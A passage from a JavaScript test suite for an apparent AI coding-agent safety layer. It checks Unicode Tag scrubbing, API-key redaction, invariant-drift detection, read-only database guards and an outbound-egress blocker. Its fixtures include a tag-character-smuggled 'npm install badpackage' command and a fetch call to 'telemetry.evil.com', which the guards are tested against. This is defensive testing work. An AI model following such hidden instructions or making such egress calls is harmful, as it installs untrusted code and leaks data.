      'Command: \u{E0001}\u{E0041}npm install --save badpackage\u{E007F}'
    ].join(' ');

    // 1. Airlock Unicode Tag scrubbing and secret sanitization
    const scrubbed = rawAdversarialTurn.replace(/[\u{E0000}-\u{E007F}]/gu, '');
    const sanitized = sanitizeForensicPayload(scrubbed);
    assert.ok(!sanitized.sanitized.includes('sk-ant-api03'));
    assert.ok(sanitized.sanitized.includes('[REDACTED:ANTHROPIC_KEY]'));
    assert.ok(!/[\u{E0000}-\u{E007F}]/u.test(sanitized.sanitized));
    assert.ok(sanitized.redactedSecretCount >= 1);

    // 2. Feed sanitized payload to DET-32 contradiction auditor
    const contradiction = auditInvariantContradiction({ command: sanitized.sanitized }, lockedInvariants);
    assert.ok(contradiction.length >= 1, 'Contradiction must be detected');
    assert.equal(contradiction[0].rule, 'Always use pnpm instead of npm');

    // 3. Evaluate semantic drift with sanitized action
    const driftEval = evaluateSemanticDrift({
      candidateAction: { command: sanitized.sanitized },
      invariants: lockedInvariants,
      flightMode: 'COACH'
    });
    assert.equal(driftEval.triggered, true);
    assert.equal(driftEval.decision, 'warn');
    assert.ok(driftEval.reanchoringDirective.includes('[DET-32 Re-anchoring Directive]'));
    assert.ok(driftEval.reanchoringDirective.length < 1500, 'Directive must remain concise (< 300 tokens)');

    // 4. Verify directive contains zero leaked secrets or unicode tags
    assert.ok(!driftEval.reanchoringDirective.includes('sk-ant-api03'));
    assert.ok(!/[\u{E0000}-\u{E007F}]/u.test(driftEval.reanchoringDirective));
  });

  // Test 3.41: Feature 41 ↔ Cross-Suite Integration
  it('3.41 Pairwise: Multi-tenant runner concurrency executes 16 isolated sandboxes enforcing all 6 invariants and benchmark score >= 96.25/100', async () => {
    const WORKER_COUNT = 16;
    const sqliteReady = await isSqliteAvailable();
    const workers = Array.from({ length: WORKER_COUNT }, (_, i) => i);

    const results = await Promise.all(
      workers.map(async (workerId) => {
        const ws = createIsolatedTestSandbox({ withAntigravityDir: true });
        try {
          // Invariant 1: 1-Click Copy /compact & Instruction (Feature 36)
          assertPlainTextCompact('<div id="compactInstruction">Type /compact in the chat box and press Enter</div><button id="btnCompactPrimary">Copy /compact</button>');
          assert.throws(
            () => assertPlainTextCompact('<button onclick="copyCompactWithGuidance()">Copy</button>'),
            /Invariant 1 Violation/
          );

          // Invariant 2: Active Source Protection (Feature 37)
          assert.equal(isIgnorablePath('src/core/router.mjs'), false);
          assert.equal(isIgnorablePath('package-lock.json'), true);
          assertActiveSourceProtected(isIgnorablePath);

          // Invariant 3: Byte-for-Byte SHA-256 Parity (Feature 38)
          const pA = path.join(ws.workspaceDir, 'pluginA.mjs');
          const pB = path.join(ws.workspaceDir, 'pluginB.mjs');
          const pDiff = path.join(ws.workspaceDir, 'pluginDiff.mjs');
          fs.writeFileSync(pA, 'export const v = 42;');
          fs.writeFileSync(pB, 'export const v = 42;');
          fs.writeFileSync(pDiff, 'export const v = 99;');
          const mirrorRes = assertMirrorParity({ filePairs: [[pA, pB]] });
          assert.equal(mirrorRes.verifiedPairs, 1);
          assert.equal(mirrorRes.mismatches.length, 0);
          assert.throws(
            () => assertMirrorParity({ filePairs: [[pA, pDiff]] }),
            /Mirror parity violations/
          );

          // Invariant 4: Zero-Trust Read-Only SQLite (AGENTS.md Invariant 4)
          assert.throws(
            () => new SqliteDatabaseSyncWrapper(path.join(ws.workspaceDir, 'guard.db'), { readOnly: false }),
            /Zero-Trust SQLite Guard/
          );
          if (sqliteReady) {
            const fixture = await createMockDatabaseFixture(path.join(ws.workspaceDir, `db_${workerId}`), {
              tables: { t: 'id INT' },
              records: [{ __table: 't', __values: { id: workerId } }]
            });
            const db = new SqliteDatabaseSyncWrapper(fixture.dbPath, { readOnly: true });
            assert.equal(db.get('SELECT count(*) as c FROM t').c, 1);
            assert.throws(() => db.get('INSERT INTO t VALUES (99)'), /Zero-Trust SQLite Guard/);
            db.close();
          } else {
            const fixture = await createMockDatabaseFixture(path.join(ws.workspaceDir, `db_${workerId}`), {
              records: [{ id: workerId }]
            });
            const db = getDatabaseClient({ dbPath: fixture.jsonlPath, readOnly: true, forceFallback: true });
            assert.equal(db.all().length, 1);
            assert.throws(() => db.all('INSERT INTO t VALUES (99)'), /Zero-Trust SQLite Guard/);
            db.close();
          }

          // Invariant 5: Zero Outbound Egress (Feature 39)
          assert.doesNotThrow(() => assertNoOutboundEgress('const localOnly = true;'));
          assert.throws(
            () => assertNoOutboundEgress('fetch("https://telemetry.evil.com")'),
            /Forbidden outbound network egress/
          );

          // Invariant 6: Zero-PII & Unicode Tag Airlock (Feature 40)
          const sanitized = sanitizeForensicPayload(`key=sk-ant-api03-worker${workerId}-token123456789`);
          assert.ok(sanitized.sanitized.includes('[REDACTED:ANTHROPIC_KEY]'));
          assert.ok(!sanitized.sanitized.includes('token123456789'));

          // Feature 41: Composite Sufficiency Benchmark Evaluation (Target >= 96.25/100)
          const prompt = [
            'Implement Feature 41 E2E Test Suite in test/e2e_tier1_features.test.mjs.',
            'Ensure 41 feature suites pass without touching other workspace files.',
            'Verify exit code 0 and expect output returns pass,',
            'assert strict zero-dep compliance with invariant constraints,',
            'and check caller imports in bin/ctxtop.mjs and src/core/prompt_rubric.mjs for mirror sync.'
          ].join(' ');

          const rubric = scorePromptSufficiency(prompt, {
            activeSetPaths: ['test/e2e_tier1_features.test.mjs', 'src/core/prompt_rubric.mjs']
          });

          const compositeScore = parseFloat(((rubric.score / (RUBRIC_DIMENSIONS.length * 2)) * 100).toFixed(2));
          return { workerId, success: true, score: compositeScore, band: rubric.band };
        } finally {
          ws.cleanup();
        }
      })
    );

    assert.equal(results.length, WORKER_COUNT);
    for (const r of results) {
      assert.equal(r.success, true);
      assert.equal(r.band, SUFFICIENCY_BANDS.HIGH);
      assert.ok(r.score >= 96.25, `Worker ${r.workerId} composite score ${r.score} < 96.25 requirement`);
    }
  });

});
